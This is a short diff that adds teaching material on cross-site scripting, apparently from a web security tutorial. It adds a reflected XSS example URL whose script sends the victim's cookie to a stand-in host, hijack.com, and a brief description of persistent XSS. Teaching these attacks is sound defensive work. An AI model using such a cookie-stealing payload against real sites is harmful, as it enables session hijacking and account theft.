@@ -168,6 +168,13 @@ print ("Thanks for your interest in %s",name);
   </BODY>
 </HTML>
   ```
+```html
+…/xss1.php?prod=grill&name=<script>document.location=http://hijack.com/save?name=“ + document.cookie</script>
+```
+<br><br><h3> Persistent XSS</h3>
+<p>
+–The attacker injects code on the server that when downloaded to the client allows further mischief.<br>
+–As before, but its embedded in a message on the server. Such as a blog or social networking message site.</p>
 
 
 
